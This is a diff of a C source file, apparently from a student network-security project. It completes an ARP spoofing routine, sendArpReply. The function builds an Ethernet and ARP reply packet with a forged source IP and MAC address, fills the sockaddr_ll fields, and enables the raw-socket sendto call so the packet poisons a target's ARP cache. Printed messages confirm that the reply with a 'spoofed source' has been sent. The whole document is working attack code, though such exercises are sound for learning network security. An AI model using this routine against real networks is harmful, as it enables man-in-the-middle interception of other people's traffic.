@@ -35,78 +35,80 @@ void toMAC(const char* adresseMAC, unsigned char* adresse)
     }
 }
 
-// void toIP(const char* adresseIP, unsigned char* adresse)
-// {
-//     int valeur = 0;
-//     int octet = 0;
-//     int position = 0;
+void toIP(const char* adresseIP, unsigned char* adresse)
+{
+    int valeur = 0;
+    int octet = 0;
 
-//     for (int i = 0; i < strlen(adresseIP); i++) {
-//         if (adresseIP[i] == '.') {
-//             adresse[octet] = (unsigned char)valeur;
-//             valeur = 0;
-//             octet++;
-//         }
-//         else if (adresseIP[i] >= '0' && adresseIP[i] <= '9') {
-//             valeur = valeur * 10 + (adresseIP[i] - '0');
-//         }
-//         else {
-//             // Gérer les erreurs de format d'adresse IP ici
-//             return;
-//         }
-//     }
+    for (size_t i = 0; i < ft_strlen(adresseIP); i++) {
+        if (adresseIP[i] == '.') {
+            adresse[octet] = (unsigned char)valeur;
+            valeur = 0;
+            octet++;
+        }
+        else if (adresseIP[i] >= '0' && adresseIP[i] <= '9') {
+            valeur = valeur * 10 + (adresseIP[i] - '0');
+        }
+    }
 
-//     adresse[octet] = (unsigned char)valeur;
-// }
+    adresse[octet] = (unsigned char)valeur;
+}
 
 
 int sendArpReply(t_main *main)
 {
     unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arphdr) + 20];
     struct ethhdr* ethHeader;
-    struct arphdr* arpHeader;
-    struct sockaddr_in target;
-	in_addr_t targetIp = inet_addr(main->targetIp);
-	in_addr_t sourceIp = inet_addr(main->sourceIp);
+    t_arp* arpHeader;
+    struct sockaddr_ll target;
+	unsigned char targetIp[4];
+	unsigned char sourceIp[4];
 	unsigned char sourceMac[6];
 	unsigned char targetMac[6];
 
+    /* CONVERT ADDRESS TEXT TO UNSIGNED CHAR[6] bytes */
 	toMAC(main->sourceMac, sourceMac);
+    toIP(main->sourceIp, sourceIp);
 	toMAC(main->targetMac, targetMac);
+	toIP(main->targetIp, targetIp);
 
     ft_memset(&buffer, 0, sizeof buffer);
     ft_memset(&target, 0, sizeof target);
 
-    target.sin_family = AF_PACKET;
-    target.sin_addr.s_addr = targetIp;
+    /* SOCKADDR_LL FOR TARGET SENDTO */
+    target.sll_family = AF_PACKET;
+    target.sll_protocol = htons(ETH_P_ARP);
+    target.sll_hatype = htons(ARPHRD_ETHER);
+    target.sll_ifindex = main->indexInterface;
+    target.sll_halen = 6;
+    ft_memcpy(&target.sll_addr, &targetMac, 6);
 
+    /* ETHERNET HEADER */
     ethHeader = (struct ethhdr *)buffer;
     ethHeader->h_proto = htons(ETH_P_ARP);
-    ft_memcpy(ethHeader->h_source, &sourceMac, 6);
-    ft_memcpy(ethHeader->h_dest, &targetMac, 6);
+    ft_memcpy(ethHeader->h_source, sourceMac, 6);
+    ft_memcpy(ethHeader->h_dest, targetMac, 6);
 
-    arpHeader = (struct arphdr *)(buffer + sizeof(struct ethhdr));
+    /* ARP HEADER */
+    arpHeader = (t_arp *)(buffer + sizeof(struct ethhdr));
     arpHeader->ar_hrd = htons(ARPHRD_ETHER);
     arpHeader->ar_pro = htons(ETH_P_IP);
     arpHeader->ar_op = htons(ARPOP_REPLY);
     arpHeader->ar_hln = 6;
     arpHeader->ar_pln = 4;
-
-    unsigned char *adress = buffer + sizeof(struct ethhdr) + sizeof(struct arphdr);
-
-    ft_memcpy(adress, &sourceMac, 6);
-    ft_memcpy(adress + arpHeader->ar_pln, &sourceIp, 4);
-    ft_memcpy(adress + arpHeader->ar_hln, &targetMac, 6);
-    ft_memcpy(adress + arpHeader->ar_pln, &targetIp, 4);
+    ft_memcpy(arpHeader->__ar_sha, sourceMac, 6);
+    ft_memcpy(arpHeader->__ar_sip, sourceIp, 4);
+    ft_memcpy(arpHeader->__ar_tha, targetMac, 6);
+    ft_memcpy(arpHeader->__ar_tip, targetIp, 4);
 
     printf("Now sending an ARP reply to the target address with spoofed source, please wait... \n");
     
-    // ssize_t packetSize = sendto(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target, sizeof(target)); // mettre le destinataire
-    // if (packetSize < 0) 
-    // {
-    //     fprintf(stderr, "%s: sendto failed: %s\n", PROGRAM, strerror(errno));
-    //     return -1;
-    // }
-	printf("Sent an ARP reply packet, you may now check the arp table on the target \n");
+    ssize_t packetSize = sendto(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
+    if (packetSize < 0) 
+    {
+        fprintf(stderr, "%s: sendto failed: %s\n", PROGRAM, strerror(errno));
+        return -1;
+    }
+	printf("Sent an ARP reply packet, you may now check the arp table on the target\n\n");
     return 0;
 }
